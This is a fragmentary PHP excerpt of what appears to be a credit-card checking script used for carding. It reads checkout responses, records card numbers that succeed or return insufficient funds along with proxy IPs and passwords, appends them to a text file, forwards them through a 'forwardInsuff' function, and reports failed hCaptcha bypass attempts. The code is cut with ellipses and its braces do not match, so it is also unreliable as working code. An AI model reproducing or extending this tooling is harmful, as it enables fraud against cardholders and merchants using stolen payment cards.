...
if ($json === null) {
    ...
    } elseif (isset($json['product']['name'])) {
        $items = $json['product']['name'];
        } 
    }
}
...
if ($status == 'succeeded') {
    $cardInfo = "Successful Checkout : $coname \nItem: $items \nPrice: ".strtoupper($currency). "$amttt \nCard: $card \nSuccess URL: $surl \nProxy IP: $proxy \nProxy Pass: $proxyauth";
...
elseif (strpos($response, 'insufficient_funds')) {
    ...
    $cardInfo = "Insufficient Funds : $coname \nItem: $items \nPrice: ".strtoupper($currency). "$amttt \nCard: $card \nSTATUS: $message \nProxy IP: $proxy \nProxy Pass: $proxyauth";
    fwrite(fopen("peru--------INSF.txt", "a"), $cardInfo . " \r\n\n");
    forwardInsuff($cardInfo);
    return;
}
elseif (strpos($response, '"verification_url": "')) {
  echo "<font color=red><b>DEAD<br> $card<br> [ HCAPTCHA Not Bypassed ] » [$ips] » [Retries: $count]<br>";
  return;
}
